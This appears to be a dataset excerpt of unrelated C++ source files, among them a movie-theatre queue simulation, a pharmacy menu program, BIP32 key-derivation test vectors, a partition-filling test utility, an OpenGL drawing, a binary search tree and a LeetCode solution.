    "\ufeff#include <iostream>\n#include \"Theatre.h\"\n#include \"Movie.h\"\n#include <chrono> \n#include <thread> \n\nusing namespace std;\n\n\n\nint main()\n{\n\tsrand(time(NULL));\n\n\t// Create Movie objects\n\tvector<string> times1 = { \"10:00AM\", \"1:00PM\", \"4:00PM\" };\n\tMovie movie1(\"Oppenheimer\", times1, 5, 10); // Example parameters for rows and columns\n\n\tvector<string> times2 = { \"11:00AM\", \"2:00PM\", \"5:00PM\" };\n\tMovie movie2(\"Kung Fu Panda 4\", times2, 6, 12); // Example parameters for rows and columns\n\n\tvector<string> times3 = { \"2:30PM\", \"7:00PM\", \"10:15PM\" };\n\tMovie movie3(\"The Fall Guy\", times3, 6, 12); // Example parameters for rows and columns\n\n\tvector<string> times4 = { \"1:00PM\", \"6:10PM\", \"12:00AM\" };\n\tMovie movie4(\"Kingdom of the Planet of the Apes\", times2, 8, 12); // Example parameters for rows and columns\n\n\t// Create a vector of Movie objects\n\tvector<Movie> movies = { movie1, movie2, movie3, movie4 };\n\n\t// Create a Theatre object with the vector of Movie objects\n\tTheatre theatre(movies);\n\t\n\t\n\tint ticketORsnack, cancel;\n\tcout << \"                                          WELCOME TO OUR MOVIE THEATRE!\" << endl<<endl;\n\tcout << \"To Enter the Ticket Queue Enter 0 - To Enter the Snack Queue Enter 1: \";\n\tdo\n\t{\n\t\tcin >> ticketORsnack;\n\t\tif (ticketORsnack != 0 && ticketORsnack != 1) cout << \"Invalid Input: Try Again.\" << endl;\n\t}\n\twhile (ticketORsnack != 0 && ticketORsnack != 1);\n\n\tcout << endl;\n\tif (ticketORsnack == 0)\n\t{\n\t\ttheatre.joinTicketQueue();\n\t\tcout << \"There are \" << theatre.getTicketCustomers() << \" Waiting Ahead of You in Line - Approximate Waiting Time: \" << theatre.getTicketWaitingTime() << \" Minutes.\" << endl;\n\n\t\tcout << \"Serving Customers:\" << endl;\n\t\t// Simulate serving ticket customers until you are the only person left in the ticket queue\n\t\twhile (theatre.getTicketQueue().size() > 1) {\n\t\t\ttheatre.serveTicketCustomer();\n\t\t\t// Adds a time delay between serving customers\n\t\t\t//Sped up for the sake of the simulation, to not wait many minutes to serve a single customer\n\t\t\tthis_thread::sleep_for(chrono::seconds(3));\n\t\t}\n\t\tcout << endl << endl;\n\t\tcout << \"Would You Like to Book or Cancel a Reservation: Enter 0 for Book or Enter 1 for Cancel: \";\n\t\tdo\n\t\t{\n\t\t\tcin >> cancel;\n\t\t\tif (cancel != 0 && cancel != 1) cout << \"Invalid Input: Try Again.\" << endl;\n\t\t} while (cancel != 0 && cancel != 1);\n\t\tcout << endl << endl;\n\n\t\tif (cancel == 1)\n\t\t\ttheatre.cancelReservation();\n\t\telse\n\t\t\ttheatre.bookSeat();\n\t\t\n\t\tcout << endl << endl;\n\n\t\tcout << \"Do You Want To Enter Snack Queue: Enter 0 for NO or Enter 1 for YES: \";\n\t\tdo\n\t\t{\n\t\t\tcin >> ticketORsnack;\n\t\t\tif (ticketORsnack != 0 && ticketORsnack != 1) cout << \"Invalid Input: Try Again.\" << endl;\n\t\t} while (ticketORsnack != 0 && ticketORsnack != 1);\n\n\t}\n\n\n\n\tif (ticketORsnack == 1)\n\t{\n\t\ttheatre.joinSnackQueue();\n\t\tcout << \"There are \" << theatre.getSnackCustomers() << \" Waiting Ahead of You in Line - Approximate Waiting Time: \" << theatre.getSnackWaitingTime() << \" Minutes.\" << endl;\n\t\t// Simulate serving snack customers until you are the only person left in the snack queue\n\t\twhile (theatre.getSnackQueue().size() > 1) {\n\t\t\ttheatre.serveSnackCustomer();\n\t\t\t// Adds a time delay between serving customers\n\t\t\t//Sped up for the sake of the simulation, to not wait many minutes to serve a single customer\n\t\t\tthis_thread::sleep_for(chrono::seconds(3));\n\t\t}\n\n\t\tcout << \"It's Your Turn, Go Ahead and Order and Enjoy Your Movie!\" << endl;\n\t}\n\n\tcout << endl << endl;\n\tcout << \"                              THANK YOU FOR CHOOSING OUR MOVIE THEATRE!\" << endl;\n\n\n\treturn 0;\n}\n",
    "#include \"index.h\"\n\nint main() {\n\tList Prescription_Queue;\n\tQueue IMP_BiLL_Queue, EXP_BiLL_Queue;\n\tPrescription_Queue.init(); IMP_BiLL_Queue.init(), EXP_BiLL_Queue.init();\n\tFILE* don_thuoc    = fopen(FILE_DON_THUOC  , \"r\");\n\tFILE* hoa_don_nhap = fopen(FILE_HOA_DON_NHAP, \"r\");\n\tFILE* hoa_don_xuat = fopen(FILE_HOA_DON_XUAT, \"r\");\n\tint choice;\n\tdo {\n\t\tsystem(\"cls\");\n\t\tMenu(1, 8);\n\t\tgetChoice(choice, 0, 8);\n\t\tswitch (choice)\t{\n\t\t\tcase 0: exit(0); break;\n\t\t\tcase 1: KHOI_TAO_DS_DON_THUOC(Prescription_Queue, don_thuoc); break;\n\t\t\tcase 2: LAP_HOA_DON(IMP_BiLL_Queue, EXP_BiLL_Queue, hoa_don_nhap, hoa_don_xuat); break;\n\t\t\tcase 3: TIM_KIEM_DON_THUOC(Prescription_Queue, IMP_BiLL_Queue, EXP_BiLL_Queue); break;\n\t\t\tcase 4: IN_DANH_SACH_HOA_DON(IMP_BiLL_Queue, EXP_BiLL_Queue); break;\n\t\t\tcase 5: TIM_THONG_TIN_DON_THUOC(IMP_BiLL_Queue, EXP_BiLL_Queue); break;\n\t\t\tcase 6: IN_RA_THONG_TIN_CAC_DON_THUOC_TON_SLG_LON_HON_N(100, IMP_BiLL_Queue, EXP_BiLL_Queue); break;\n\t\t\tcase 7: THONG_KE_THUOC_CO_THOI_HAN_SU_DUNG_DUOI_30_NGAY(IMP_BiLL_Queue); break;\n\t\t\tcase 8: XOA_DON_THUOC(Prescription_Queue, IMP_BiLL_Queue); break;\n\t\t}\n\t\tsystem(\"pause>0\");\n\t} while(choice);\n\tfclose(don_thuoc); fclose(hoa_don_nhap); fclose(hoa_don_xuat);\n\treturn (0);\n}\n",
    "// Copyright (c) 2013-2015 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <boost/test/unit_test.hpp>\n\n#include <base58.h>\n#include <key.h>\n#include <uint256.h>\n#include <util.h>\n#include <utilstrencodings.h>\n#include <test/test_questchain.h>\n\n#include <string>\n#include <vector>\n\nstruct TestDerivation {\n    std::string pub;\n    std::string prv;\n    unsigned int nChild;\n};\n\nstruct TestVector {\n    std::string strHexMaster;\n    std::vector<TestDerivation> vDerive;\n\n    explicit TestVector(std::string strHexMasterIn) : strHexMaster(strHexMasterIn) {}\n\n    TestVector& operator()(std::string pub, std::string prv, unsigned int nChild) {\n        vDerive.push_back(TestDerivation());\n        TestDerivation &der = vDerive.back();\n        der.pub = pub;\n        der.prv = prv;\n        der.nChild = nChild;\n        return *this;\n    }\n};\n\nTestVector test1 =\n  TestVector(\"000102030405060708090a0b0c0d0e0f\")\n    (\"xpub661MyMwAqRbcFtXgS5sYJABqqG9YLmC4Q1Rdap9gSE8NqtwybGhePY2gZ29ESFjqJoCu1Rupje8YtGqsefD265TMg7usUDFdp6W1EGMcet8\",\n     \"xprv9s21ZrQH143K3QTDL4LXw2F7HEK3wJUD2nW2nRk4stbPy6cq3jPPqjiChkVvvNKmPGJxWUtg6LnF5kejMRNNU3TGtRBeJgk33yuGBxrMPHi\",\n     0x80000000)\n    (\"xpub68Gmy5EdvgibQVfPdqkBBCHxA5htiqg55crXYuXoQRKfDBFA1WEjWgP6LHhwBZeNK1VTsfTFUHCdrfp1bgwQ9xv5ski8PX9rL2dZXvgGDnw\",\n     \"xprv9uHRZZhk6KAJC1avXpDAp4MDc3sQKNxDiPvvkX8Br5ngLNv1TxvUxt4cV1rGL5hj6KCesnDYUhd7oWgT11eZG7XnxHrnYeSvkzY7d2bhkJ7\",\n     1)\n    (\"xpub6ASuArnXKPbfEwhqN6e3mwBcDTgzisQN1wXN9BJcM47sSikHjJf3UFHKkNAWbWMiGj7Wf5uMash7SyYq527Hqck2AxYysAA7xmALppuCkwQ\",\n     \"xprv9wTYmMFdV23N2TdNG573QoEsfRrWKQgWeibmLntzniatZvR9BmLnvSxqu53Kw1UmYPxLgboyZQaXwTCg8MSY3H2EU4pWcQDnRnrVA1xe8fs\",\n     0x80000002)\n    (\"xpub6D4BDPcP2GT577Vvch3R8wDkScZWzQzMMUm3PWbmWvVJrZwQY4VUNgqFJPMM3No2dFDFGTsxxpG5uJh7n7epu4trkrX7x7DogT5Uv6fcLW5\",\n     \"xprv9z4pot5VBttmtdRTWfWQmoH1taj2axGVzFqSb8C9xaxKymcFzXBDptWmT7FwuEzG3ryjH4ktypQSAewRiNMjANTtpgP4mLTj34bhnZX7UiM\",\n     2)\n    (\"xpub6FHa3pjLCk84BayeJxFW2SP4XRrFd1JYnxeLeU8EqN3vDfZmbqBqaGJAyiLjTAwm6ZLRQUMv1ZACTj37sR62cfN7fe5JnJ7dh8zL4fiyLHV\",\n     \"xprvA2JDeKCSNNZky6uBCviVfJSKyQ1mDYahRjijr5idH2WwLsEd4Hsb2Tyh8RfQMuPh7f7RtyzTtdrbdqqsunu5Mm3wDvUAKRHSC34sJ7in334\",\n     1000000000)\n    (\"xpub6H1LXWLaKsWFhvm6RVpEL9P4KfRZSW7abD2ttkWP3SSQvnyA8FSVqNTEcYFgJS2UaFcxupHiYkro49S8yGasTvXEYBVPamhGW6cFJodrTHy\",\n     \"xprvA41z7zogVVwxVSgdKUHDy1SKmdb533PjDz7J6N6mV6uS3ze1ai8FHa8kmHScGpWmj4WggLyQjgPie1rFSruoUihUZREPSL39UNdE3BBDu76\",\n     0);\n\nTestVector test2 =\n  TestVector(\"fffcf9f6f3f0edeae7e4e1dedbd8d5d2cfccc9c6c3c0bdbab7b4b1aeaba8a5a29f9c999693908d8a8784817e7b7875726f6c696663605d5a5754514e4b484542\")\n    (\"xpub661MyMwAqRbcFW31YEwpkMuc5THy2PSt5bDMsktWQcFF8syAmRUapSCGu8ED9W6oDMSgv6Zz8idoc4a6mr8BDzTJY47LJhkJ8UB7WEGuduB\",\n     \"xprv9s21ZrQH143K31xYSDQpPDxsXRTUcvj2iNHm5NUtrGiGG5e2DtALGdso3pGz6ssrdK4PFmM8NSpSBHNqPqm55Qn3LqFtT2emdEXVYsCzC2U\",\n     0)\n    (\"xpub69H7F5d8KSRgmmdJg2KhpAK8SR3DjMwAdkxj3ZuxV27CprR9LgpeyGmXUbC6wb7ERfvrnKZjXoUmmDznezpbZb7ap6r1D3tgFxHmwMkQTPH\",\n     \"xprv9vHkqa6EV4sPZHYqZznhT2NPtPCjKuDKGY38FBWLvgaDx45zo9WQRUT3dKYnjwih2yJD9mkrocEZXo1ex8G81dwSM1fwqWpWkeS3v86pgKt\",\n     0xFFFFFFFF)\n    (\"xpub6ASAVgeehLbnwdqV6UKMHVzgqAG8Gr6riv3Fxxpj8ksbH9ebxaEyBLZ85ySDhKiLDBrQSARLq1uNRts8RuJiHjaDMBU4Zn9h8LZNnBC5y4a\",\n     \"xprv9wSp6B7kry3Vj9m1zSnLvN3xH8RdsPP1Mh7fAaR7aRLcQMKTR2vidYEeEg2mUCTAwCd6vnxVrcjfy2kRgVsFawNzmjuHc2YmYRmagcEPdU9\",\n     1)\n    (\"xpub6DF8uhdarytz3FWdA8TvFSvvAh8dP3283MY7p2V4SeE2wyWmG5mg5EwVvmdMVCQcoNJxGoWaU9DCWh89LojfZ537wTfunKau47EL2dhHKon\",\n     \"xprv9zFnWC6h2cLgpmSA46vutJzBcfJ8yaJGg8cX1e5StJh45BBciYTRXSd25UEPVuesF9yog62tGAQtHjXajPPdbRCHuWS6T8XA2ECKADdw4Ef\",\n     0xFFFFFFFE)\n    (\"xpub6ERApfZwUNrhLCkDtcHTcxd75RbzS1ed54G1LkBUHQVHQKqhMkhgbmJbZRkrgZw4koxb5JaHWkY4ALHY2grBGRjaDMzQLcgJvLJuZZvRcEL\",\n     \"xprvA1RpRA33e1JQ7ifknakTFpgNXPmW2YvmhqLQYMmrj4xJXXWYpDPS3xz7iAxn8L39njGVyuoseXzU6rcxFLJ8HFsTjSyQbLYnMpCqE2VbFWc\",\n     2)\n    (\"xpub6FnCn6nSzZAw5Tw7cgR9bi15UV96gLZhjDstkXXxvCLsUXBGXPdSnLFbdpq8p9HmGsApME5hQTZ3emM2rnY5agb9rXpVGyy3bdW6EEgAtqt\",\n     \"xprvA2nrNbFZABcdryreWet9Ea4LvTJcGsqrMzxHx98MMrotbir7yrKCEXw7nadnHM8Dq38EGfSh6dqA9QWTyefMLEcBYJUuekgW4BYPJcr9E7j\",\n     0);\n\nTestVector test3 =\n  TestVector(\"4b381541583be4423346c643850da4b320e46a87ae3d2a4e6da11eba819cd4acba45d239319ac14f863b8d5ab5a0d0c64d2e8a1e7d1457df2e5a3c51c73235be\")\n    (\"xpub661MyMwAqRbcEZVB4dScxMAdx6d4nFc9nvyvH3v4gJL378CSRZiYmhRoP7mBy6gSPSCYk6SzXPTf3ND1cZAceL7SfJ1Z3GC8vBgp2epUt13\",\n     \"xprv9s21ZrQH143K25QhxbucbDDuQ4naNntJRi4KUfWT7xo4EKsHt2QJDu7KXp1A3u7Bi1j8ph3EGsZ9Xvz9dGuVrtHHs7pXeTzjuxBrCmmhgC6\",\n      0x80000000)\n    (\"xpub68NZiKmJWnxxS6aaHmn81bvJeTESw724CRDs6HbuccFQN9Ku14VQrADWgqbhhTHBaohPX4CjNLf9fq9MYo6oDaPPLPxSb7gwQN3ih19Zm4Y\",\n     \"xprv9uPDJpEQgRQfDcW7BkF7eTya6RPxXeJCqCJGHuCJ4GiRVLzkTXBAJMu2qaMWPrS7AANYqdq6vcBcBUdJCVVFceUvJFjaPdGZ2y9WACViL4L\",\n      0);\n\nvoid RunTest(const TestVector &test) {\n    std::vector<unsigned char> seed = ParseHex(test.strHexMaster)",
    "// Copyright (c) 2024 Arista Networks, Inc.  All rights reserved.\n// Arista Networks, Inc. Confidential and Proprietary.\n\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <thread>\n#include <cstdint>\n#include <mutex>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <linux/fs.h>\n#include <sys/ioctl.h>\n#include <sys/statvfs.h>\n\n#ifndef __USE_GNU\n#define __USE_GNU\n#endif\n\nstd::mutex mtx; // Mutex for synchronized output\n\nbool createFileToFillPartition(const std::string& filePath) {\n    // Open a file at the specified path for writing\n    std::ofstream outfile(filePath, std::ios::binary);\n    if (!outfile.is_open()) {\n        std::cerr << \"Error: Unable to open file for writing\" << std::endl;\n        return false;\n    }\n\n    struct statvfs stat;\n    if (statvfs(\"/mnt/flash\", &stat) != 0) {\n        std::cerr << \"Error: Unable to get filesystem statistics\" << std::endl;\n        outfile.close();\n        return false;\n    }\n    unsigned long long totalSize = stat.f_blocks * stat.f_frsize; // Total size in bytes\n    unsigned long long ninetyPercent = (9 * totalSize) / 10; // 90% of total size\n    unsigned long long freeSpace = stat.f_bfree * stat.f_frsize; // Free space in bytes\n    std::cout << \"totalSize: \" << totalSize << \" ninetyPercent: \" << ninetyPercent << std::endl;\n    unsigned long long bytesWritten = totalSize - freeSpace;\n    std::cout << \"freeSpace: \" << freeSpace << \" Initial bytesWritten: \" << bytesWritten << std::endl;\n    const char data[] = \"Lorem ipsum dolor sit amet, consectetur adipiscing elit.\";\n    while (bytesWritten < ninetyPercent) {\n        unsigned long long remainingBytes = ninetyPercent - bytesWritten;\n        unsigned long long writeSize = sizeof(data) - 1; // Exclude null terminator\n        if (writeSize > remainingBytes) {\n            writeSize = remainingBytes;\n        }\n        outfile.write(data, writeSize);\n        if (!outfile) {\n            std::cerr << \"Error: Write operation failed\" << std::endl;\n            outfile.close();\n            return false;\n        }\n        bytesWritten += writeSize;\n        /*\n         *std::cout << \"bytesWritten: \" << bytesWritten<< std::endl;\n         */\n    }\n\n    // Close the file\n    outfile.close();\n\n    std::cout << \"File created and filled up to 90% of partition size successfully\" << std::endl;\n    return true;\n}\n\nint main() {\n    std::string filePath = \"/mnt/flash/FillData\";\n    if (createFileToFillPartition(filePath)) {\n        std::cout << \"SSD filled at least 90%\" << std::endl;\n    } else {\n        std::cerr << \"Could not fill SSD\" << std::endl;\n    }\n    return 0;\n}\n\n",
    "#include<GL/glut.h>\nvoid init(){\n\tglClearColor(0, 0, 0, 1);\n\tglMatrixMode(GL_PROJECTION);\n    glOrtho(-200,200,-200,200,-200,200);\n\n\n}\nvoid display() {\n\tglClear(GL_COLOR_BUFFER_BIT);\n\t//white quad\n\tglBegin(GL_QUADS);\n\tglColor3f(1, 1, 1);\n\tglVertex2i(-20,0);\n\tglVertex2i(-20, 15);\n\tglVertex2i(36, 15);\n\tglVertex2i(36, -15);\n\tglEnd();\n\t//red quad\n\tglColor3f(1, 0, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-20, -15);\n\tglVertex2i(-20,0);\n\tglVertex2i(36,0);\n\tglVertex2i(36, -15);\n\tglEnd();\n\t// blue triangle\n\tglColor3f(0, 0, 1);\n\tglBegin(GL_TRIANGLES);\n\tglVertex2i(-20, -15);\n\tglVertex2i(-20, 15);\n\tglVertex2i(-2, 0);\n\tglEnd();\n\t//pole \n\tglColor3f(0, 1, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-25,-75);\n\tglVertex2i(-25,15);\n\tglVertex2i(-20,15 );\n\tglVertex2i(-20, -75);\n\tglEnd();\n\t//base height\n\tglColor3f(1, 1, 0);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-35,-102);\n\tglVertex2i(-35,-75);\n\tglVertex2i(-10,-75);\n\tglVertex2i(-10,-102);\n\tglEnd();\n\t// top stand \n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-40,-83);\n\tglVertex2i(-35,-75);\n\tglVertex2i(-10, -75);\n\tglVertex2i(-15,-83);\n\tglEnd();\n\t//stand hieght\n\tglColor3f(1, 0, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-40, -87);\n\tglVertex2i(-40,-83);\n\tglVertex2i(-15,-83);\n\tglVertex2i(-15,-87);\n\tglEnd();\n\t//middle stand\n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-45,-92);\n\tglVertex2i(-40,-87);\n\tglVertex2i(-15,-87);\n\tglVertex2i(-20,-92);\n\tglEnd();\n\tglColor3f(1, 0, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-45,-97);\n\tglVertex2i(-45,-92);\n\tglVertex2i(-20,-92);\n\tglVertex2i(-20,-97);\n\tglEnd();\n\tglColor3f(1, 0.45, 0.5);\n\tglBegin(GL_QUADS);\n\tglVertex2i(-50,-102);\n\tglVertex2i(-45,-97);\n\tglVertex2i(-20,-97);\n\tglVertex2i(-25,-102);\n\tglEnd();\n\n\tglFlush();\n\n\n}\nint main(int argc,char** argv) {\n\tglutInit(&argc, argv);\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\n\tglutInitWindowPosition(0, 0);\n\tglutInitWindowSize(1000, 700);\n\tglutCreateWindow(\"day one\");\n\tinit();\n\tglutDisplayFunc(display );\n\tglutMainLoop();\n\t\n\n\t\n}",
    "#include<iostream>\n#include<stack>\nusing namespace std;\nstruct node{\n    int sal;\n    string name;\n    string emp_id;\n    node *left;\n    node *right;\n};\nnode *get_node(){\n    node *temp;\n    temp = new node;\n    temp->left=nullptr;\n    temp->right=nullptr;\n    cout<<\"Enter the employee name :\\n\";\n    cin>>temp->name;\n    cout<<\"\\nEnter the salary of employee :\\n\";\n    cin>>temp->sal;\n    cout<<\"\\nEnter employee id of employee :\\n\";\n    cin>>temp->emp_id;\n    return temp;\n}\nnode *create(){\n    node *New,*ptr,*root;\n    int choice;\n    root=nullptr;\n    ptr=nullptr;\n    do{\n        New=get_node();\n        if(root==nullptr)\n            root=New;\n        else{\n            ptr=root;\n            while(true){\n                if(ptr->sal > New->sal){\n                    if(ptr->left==nullptr){\n                        ptr->left=New;\n                        break;\n                    }\n                    else\n                        ptr=ptr->left;\n                }\n                else{\n                    if(ptr->right==nullptr){\n                        ptr->right=New;\n                        break;\n                    }\n                    else\n                        ptr=ptr->right;\n                }\n            }\n        }\n        cout<<\"do you want to more data (1/0)\\n\";\n        cin>>choice;\n    }\n    while(choice==1);\n    return root;\n}\nnode *insert(node *root){\n    node *New,*ptr;\n    New=get_node();\n    if(root==nullptr)\n        root=New;\n    else{\n        ptr=root;\n        while(true){\n            if(ptr->sal > New->sal){\n                if(ptr->left==nullptr){\n                    ptr->left=New;\n                    break;\n                }\n                else\n                    ptr=ptr->left;\n            }\n            else{\n                if(ptr->right==nullptr){\n                    ptr->right=New;\n                    break;\n                }\n                else\n                    ptr=ptr->right;\n            }\n        }\n    }\n    cout<<\"\\nNode inserted successfully \\n\";\n    return root;\n}\nvoid *find(node *root,int x){\n    if(root==nullptr)\n        return NULL;\n    if(root->sal==x){\n        cout<<\"employee found \\n\";\n        cout<<root->name<<\"\\t\";\n        cout<<root->sal<<\"\\t\";\n        cout<<root->emp_id<<\"\\n\";\n        return root;\n    }    \n    if(x >root->sal)\n        return find (root->right , x);\n    return find (root-> left, x);\n}\nvoid find_max(node *root){\n    node *ptr;\n    ptr=root;\n    while(ptr->right!=nullptr)\n        ptr=ptr->right;\n    cout<<\"MAXIMUM SALARY EMPLOYEE IS :\\n\";\n    cout<<ptr->name<<\"\\t\"<<ptr->sal<<\"\\t\"<<ptr->emp_id<<endl;    \n}\nvoid find_min(node *root){\n    node *ptr;\n    ptr=root;\n    while(ptr->left!=nullptr)\n        ptr=ptr->left;\n    cout<<\"MINIMUM SALARY EMPLOYEE IS :\\n\";\n    cout<<ptr->name<<\"\\t\"<<ptr->sal<<\"\\t\"<<ptr->emp_id<<endl;    \n}\nnode* make_empty(node* root) {\n    if (root == nullptr) {\n        cout << \"Record is already empty\\n\";\n        return nullptr;\n    }\n\n    if (root->left != nullptr)\n        make_empty(root->left);\n    \n    if (root->right != nullptr)\n        make_empty(root->right);\n\n    delete root;\n    return nullptr;\n}\nvoid delete_node(node *&root) {\n    node *ptr, *prev, *temp;\n    int key;\n    ptr = root;\n    prev = nullptr;\n    cout << \"Enter the salary of employee that you want to delete :\\n\";\n    cin >> key;\n    while (ptr != nullptr && ptr->sal != key) {\n        prev = ptr;\n        if (ptr->sal > key)\n            ptr = ptr->left;\n        else\n            ptr = ptr->right;\n    }\n    if (ptr == nullptr) {\n        cout << \"Element not found\\n\";\n        return;\n    }\n    if (ptr->left == nullptr && ptr->right == nullptr) {\n        \n        if (prev->sal > key)\n            prev->left = nullptr;\n        else\n            prev->right = nullptr;\n        delete ptr;\n        cout << \"Element deleted successfully \\n\";\n    } else if (ptr->left != nullptr && ptr->right == nullptr) {\n        \n        if (prev->sal > key)\n            prev->left = ptr->left;\n        else\n            prev->right = ptr->left;\n        delete ptr;\n        cout << \"Element deleted successfully \\n\";\n    } else if (ptr->left == nullptr && ptr->right != nullptr) {\n        if (prev->sal > key)\n            prev->left = ptr->right;\n        else\n            prev->right = ptr->right;\n        delete ptr;\n        cout << \"Element deleted successfully \\n\";\n    } else {\n        temp = ptr->right;\n        while (temp->left != nullptr)\n            temp = temp->left;\n        temp->left = ptr->left;\n        if (prev->sal > key)\n            prev->left = ptr->right;\n        else\n            prev->right = ptr->right;\n        delete ptr;\n        cout << \"Element deleted successfully \\n\";\n    }\n}\n\nvoid inorder_dis(node* h) {\n    if (h == nullptr) {\n        cout << \"Tree is empty\\n\";\n        return;\n    }\n    else {\n        if (h->left != nullptr)\n            inorder_dis(h->left);\n        cout << h->name << \"\\t\" << h->sal << \"\\t\" << h->emp_id << \"\\n\";\n        if (h->right != nullptr)\n            inorde",
    "#include <iostream>\r\n#include <string.h>\r\n#include <fstream>\r\n#include \"Compete.h\"\r\n\r\nusing namespace std;\r\n\r\nunsigned long timeA;\r\nunsigned long timeB;\r\n\r\nvoid determineResult(int res, int &aWin, int &bWin, int &tie)\r\n{\r\n\tswitch (res)\r\n\t{\r\n\tcase 0:\r\n\t\ttie++; //\u5e73\u5c40\r\n\t\tcout << \"A and B tied\" << endl;\r\n\t\tbreak;\r\n\tcase 1:\r\n\t\taWin++; //A\u8d62\r\n\t\tcout << \"A - won\" << endl;\r\n\t\tbreak;\r\n\tcase 2:\r\n\t\tbWin++; //B\u8d62\r\n\t\tcout << \"B - won\" << endl;\r\n\t\tbreak;\r\n\tcase 3:\r\n\t\tbWin++; //A\u51fa\u9519,\u7b97B\u8d62\r\n\t\tcout << \"A - bug occurred\" << endl;\r\n\t\tbreak;\r\n\tcase 4:\r\n\t\tbWin++; //A\u7ed9\u51fa\u975e\u6cd5\u843d\u5b50,\u7b97B\u8d62\r\n\t\tcout << \"A - made illegal step\" << endl;\r\n\t\tbreak;\r\n\tcase 5:\r\n\t\taWin++; //B\u51fa\u9519,\u7b97A\u8d62\r\n\t\tcout << \"B - bug occurred\" << endl;\r\n\t\tbreak;\r\n\tcase 6:\r\n\t\taWin++; //B\u7ed9\u51fa\u975e\u6cd5\u843d\u5b50,\u7b97A\u8d62\r\n\t\tcout << \"B - made illegal step\" << endl;\r\n\t\tbreak;\r\n\tcase 7:\r\n\t\tbWin++; //A\u8d85\u65f6,\u7b97B\u8d62\r\n\t\tcout << \"A - timed out\" << endl;\r\n\t\tbreak;\r\n\tcase 8:\r\n\t\taWin++; //B\u8d85\u65f6,\u7b97A\u8d62\r\n\t\tcout << \"B - timed out\" << endl;\r\n\t\tbreak;\r\n\tcase -1:\r\n\t\tcout << \"Load File A Error\" << endl;\r\n\t\tbreak;\r\n\tcase -2:\r\n\t\tcout << \"Load File B Error\" << endl;\r\n\t\tbreak;\r\n\tcase -3:\r\n\t\tcout << \"Function Interface Error in A\" << endl;\r\n\t\tbreak;\r\n\tcase -4:\r\n\t\tcout << \"Function Interface Error in B\" << endl;\r\n\t\tbreak;\r\n\tdefault:\r\n\t\tcout << \"Platform Error\" << endl;\r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n\tif (argc != 5)\r\n\t{\r\n\t\tcout << \"Usage:\" << endl;\r\n\t\tcout << argv[0] << \" <StrategyA.so> <StrategyB.so> <result file name> <times to compete>\" << endl;\r\n\t\treturn 0;\r\n\t}\r\n\tint res;\r\n\tofstream out(argv[3]);\r\n\r\n\tint aWin = 0, bWin = 0, tie = 0;\r\n\tint numRounds = atoi(argv[4]);\r\n\r\n\tfor (int i = 0; i < numRounds; i++)\r\n\t{\r\n\t\tauto seed = time(0);\r\n\t\tsrand(seed);\r\n\t\tcout << \"Round \" << i << \" seed: \" << seed << \" :\" << endl;\r\n\t\tout << i << \":\" << endl;\r\n\r\n\t\tData *data = new Data();\r\n\r\n\t\tcout << \"A first:\" << endl;\r\n\t\ttimeA = 0;\r\n\t\ttimeB = 0;\r\n\t\t//data->reset();\r\n\t\tres = compete(argv[1], argv[2], true, data);\r\n\t\tdetermineResult(res, aWin, bWin, tie);\r\n\t\tout << res << \"\\t\" << timeA << \"\\t\" << timeB << endl;\r\n\r\n\t\tcout << \"B first:\" << endl;\r\n\t\ttimeA = 0;\r\n\t\ttimeB = 0;\r\n\t\tdata->reset();\r\n\t\tres = compete(argv[1], argv[2], false, data);\r\n\t\tdetermineResult(res, aWin, bWin, tie);\r\n\t\tout << res << \"\\t\" << timeA << \"\\t\" << timeB << endl;\r\n\t\tout << endl;\r\n\t\tcout << endl;\r\n\r\n\t\tdelete data;\r\n\t}\r\n\r\n\tdouble rioAWin = (1.0 * aWin) / (2.0 * numRounds);\r\n\tdouble rioBWin = (1.0 * bWin) / (2.0 * numRounds);\r\n\tdouble rioTie = (1.0 * tie) / (2.0 * numRounds);\r\n\r\n\tout << \"Stat:\" << endl;\r\n\tout << \"ratio of A wins : \" << rioAWin << endl;\r\n\tout << \"ratio of B wins : \" << rioBWin << endl;\r\n\tout << \"ratio of Tie : \" << rioTie << endl;\r\n\tout << endl;\r\n\tout << \"ratio of (A wins + tie) : \" << rioAWin + rioTie << endl;\r\n\tout << \"ratio of (B wins + tie) : \" << rioBWin + rioTie << endl;\r\n\r\n\tout.close();\r\n\r\n\tcout << \"Stat:\" << endl;\r\n\tcout << \"ratio of A wins : \" << rioAWin << endl;\r\n\tcout << \"ratio of B wins : \" << rioBWin << endl;\r\n\tcout << \"ratio of Tie : \" << rioTie << endl;\r\n\tcout << endl;\r\n\tcout << \"ratio of (A wins + tie) : \" << rioAWin + rioTie << endl;\r\n\tcout << \"ratio of (B wins + tie) : \" << rioBWin + rioTie << endl;\r\n\r\n\treturn 0;\r\n}\r\n",
    "class Solution {\npublic:\n    vector<long long> maximumSegmentSum(vector<int>& nums, vector<int>& removeQueries) {\n        int n = nums.size();\n        multiset<long long> s;\n        s.insert(0);\n        set<pair<int, int>> in;\n        vector<long long> pre(n, nums[0]);\n        for(int i = 1; i < n; i++) pre[i] = pre[i - 1] + nums[i];\n        \n        in.insert({0, n - 1});\n        \n        s.insert(pre[n - 1]);\n        \n        vector<long long> ans;\n        for(auto p : removeQueries) {\n            auto it = in.upper_bound({p, 2e9});\n            it--;\n            \n            long long L = (p ? pre[p - 1] : 0) - (it -> first ? pre[it -> first - 1] : 0);\n            long long R = pre[it -> second] - pre[p];\n            long long T = pre[it -> second] - (it -> first ? pre[it -> first - 1] : 0);\n            \n            s.erase(s.find(T));\n            if(it -> first <= p - 1) {\n                in.insert({it -> first, p - 1});\n                s.insert(L);\n            }\n            if(it -> second >= p + 1) {\n                in.insert({p + 1, it -> second});\n                s.insert(R);\n            }\n            \n            in.erase(it);\n            ans.push_back(*s.rbegin());\n        }\n        return ans;\n    }\n};\n",
